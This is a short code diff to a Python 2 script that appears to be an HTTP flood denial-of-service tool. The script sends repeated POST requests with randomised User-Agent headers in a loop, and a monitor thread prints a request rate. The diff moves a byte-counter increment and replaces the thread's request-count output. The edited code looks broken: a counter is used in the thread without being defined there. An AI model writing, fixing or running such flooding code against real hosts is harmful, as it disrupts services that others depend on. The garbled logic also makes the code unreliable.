@@ -89,11 +89,9 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
 	request.get_method = lambda: "POST"
+	bytes += 65535
 	try:
 		for i in range(bytes):
-			bytes += 65535
-				
-			print "Rps: %d" % bytes
 			urllib2.urlopen(request)
 	except socket.error as e:
 			#print e.code
@@ -128,9 +126,9 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while True:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
+			bytes += 65535
+
+			print "Rps: %d" % bytes
 
 #execute 
 if len(sys.argv) < 2:
